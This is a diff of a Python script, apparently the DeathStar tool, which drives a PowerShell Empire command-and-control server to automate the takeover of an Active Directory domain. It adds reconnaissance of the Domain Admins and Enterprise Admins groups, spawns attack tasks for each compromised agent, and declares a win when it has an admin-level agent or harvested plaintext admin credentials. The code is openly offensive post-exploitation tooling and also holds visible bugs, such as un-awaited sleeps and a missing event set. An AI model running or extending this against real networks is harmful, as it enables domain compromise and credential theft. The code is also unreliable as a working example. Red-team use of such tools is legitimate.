@@ -23,6 +23,7 @@ __version__ = "2.0"
 import logging
 import argparse
 import asyncio
+from deathstar.kybercrystals import KyberCrystals
 from deathstar.empire import EmpireApiClient, EmpireLoginError
 from deathstar.utils import CustomArgFormatter
 
@@ -33,55 +34,69 @@ log = logging.getLogger("deathstar")
 log.setLevel(logging.DEBUG)
 log.addHandler(handler)
 
+
 class DeathStar:
     def __init__(self, empire):
         self.empire = empire
+
         self.enterprise_admins = []
         self.admins = []
         self.domain_controllers = []
         self.priority_targets = []
 
-        self.agents = asyncio.Queue()
+        self.fire_missions = []
         self.won = asyncio.Event()
         self.recon_performed = asyncio.Event()
-    
+
+        self.kybers = KyberCrystals(self)
+
     async def agent_running_under_domain_account(self, agent):
         agent = await self.empire.agents.get(agent)
         host = agent["hostname"]
-        domain, user = agent["username"].split('\\')
+        domain, user = agent["username"].split("\\")
 
-        if domain != host and user != 'SYSTEM':
+        if domain != host and user != "SYSTEM":
             return True
         return False
 
     async def recon(self, agent):
         if await self.agent_running_under_domain_account(agent):
             log.info("Starting recon")
-            #domain_sid = self.empire.modules.execute("powershell/management/get_domain_sid", agent)
 
-        if not self.admins and not self.domain_controllers:
-            return
+        domain_sid = await self.kybers.get_domain_sid(agent)[0]
+        domain_admins, enterprise_admins = await asyncio.gather(
+            *[
+                self.kybers.get_group_members(domain_sid + "-512"),
+                self.kybers.get_group_members(domain_sid + "-519"),
+            ]
+        )
 
         self.recon_performed.set()
 
     async def fire(self, agent):
-        pass
+        await self.recon_performed.wait()
 
-    async def poll_agents(self):
+    async def poll_for_agents(self):
         while not self.won.is_set():
             agents = await self.empire.agents.get()
             for agent in agents:
-                if not self.recon_performed.is_set():
-                    await self.recon(agent)
+                if not any(
+                    map(lambda t: t.get_name() == agent["name"], self.fire_missions)
+                ):
+                    asyncio.create_task(self.fire(agent), name=agent["name"])
+
+            asyncio.sleep(1)
+
+        await asyncio.gather(*self.fire_missions)
 
     async def check_for_win(self):
         while not self.won.is_set():
             for agent in await self.empire.agents.get():
-                if agent['username'] in self.admins and agent['high_integrity']:
-                        self.won.set()
+                if agent["username"] in self.admins and agent["high_integrity"]:
+                    self.won.set()
 
             for cred in await self.empire.credentials.get():
-                if cred['credtype'] == 'plaintext':
+                if cred["credtype"] == "plaintext":
                     account = f"{cred['domain'].upper()}\\{cred['username']}"
                     if account in self.admins:
                         self.won.is_set()
@@ -89,10 +104,10 @@ class DeathStar:
             asyncio.sleep(1)
 
     async def power_up(self):
-        if 'error' in await self.empire.listeners.get("DeathStar"):
+        if "error" in await self.empire.listeners.get("DeathStar"):
             await self.empire.listeners.create(additional={"Port": 8443})
 
-        await asyncio.gather(*[self.check_for_win(), self.poll_agents()])
+        await asyncio.gather(*[self.check_for_win(), self.poll_for_agents()])
 
 
 async def main(args):
@@ -107,15 +122,23 @@ async def main(args):
 
 
 def run():
-    args = argparse.ArgumentParser(description=f"""
+    args = argparse.ArgumentParser(
+        description=f"""
 DeathStar!
 
 Version: {__version__}
     """,
-        formatter_class=CustomArgFormatter)
-    args.add_argument('-u', '--username', type=str, default='empireadmin', help='Empire username')
-    args.add_argument('-p', '--password', type=str, default='Password123!', help='Empire password')
-    args.add_argument("--api-host", type=str, default="127.0.0.1", help="Empire API IP/Hostname")
+        formatter_class=CustomArgFormatter,
+    )
+    args.add_argument(
+        "-u", "--username", type=str, default="empireadmin", help="Empire username"
+    )
+    args.add_argument(
+        "-p", "--password", type=str, default="Password123!", help="Empire password"
+    )
+    args.add_argument(
+        "--api-host", type=str, default="127.0.0.1", help="Empire API IP/Hostname"
+    )
     args.add_argument("--api-port", type=int, default=1337, help="Empire API port")
     args.add_argument("--debug", action="store_true", help="Enable debug output")
 
@@ -128,5 +151,5 @@ Version: {__version__}
     asyncio.run(main(args))
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     run()
